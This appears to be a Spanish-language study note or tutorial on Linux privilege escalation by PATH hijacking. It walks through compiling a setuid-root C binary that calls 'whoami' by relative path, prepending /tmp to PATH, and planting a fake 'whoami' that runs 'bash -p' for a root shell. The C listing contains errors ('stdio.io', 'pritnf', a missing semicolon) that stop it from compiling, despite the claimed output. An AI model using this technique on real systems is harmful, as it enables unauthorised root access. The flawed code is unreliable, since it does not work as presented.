> Esta tipo de ataque para escalada de privilegio hace que en el PATH, variable de entorno, se introduzca un nuevo path hacia un archivo que ejecuta acciones maliciosas. Es decir manipulamos el PATH.

## Paso a paso
```
apt install gcc
```
- Para hacer scripting en C
- Nos movemos al directorio `tmp` y generamos un archivo:
```
cd tmp
nano test.c
```
- Vamos a ejecutar la instruccion `whoami` dos veces, una de forma absoluta y otra de forma relativa.
```c
#include <stdio.io>

int main(){
	setuid(0);
	printf("\n[+] Actualmente somos el siguiente usuario");
	system("/usr/bin/whoami");
	pritnf("\n[+] Actualmente somos el siguiente usuario");
	system("whoami");
	return 0
}
```
- Creamos el ejecutable y damos permisos
```
gcc test.c -o test
chmod u+s test
./test
```
- En la salida veriamos `root` `root`

- Para ver las lineas que se pueden leer del binario
```
strings test | grep whoami
```

- $PATH multiples rutas, para ejecutar comandos desde las rutas especificadas aqui en orden
- Podemos agregarle un camino hacia tmp
```
export PATH=/tmp/:$PATH
echo $PATH
```

- Creamos otro archivo whoami, que es el que queremos que ejecute
```
nano whoami
# dentro del archivo
bash -p
```
- Permisos
```
chmod +x whoami
```
- Ejecutamos `test`
```
./test 
```
- test ejecuta la instruccion whoami mirando el path, como en primer lugar esta el directorio /tmp ejecuta bash -p, que es lo que hay dentro de whoami, abriendo asi una consola con privilegios.
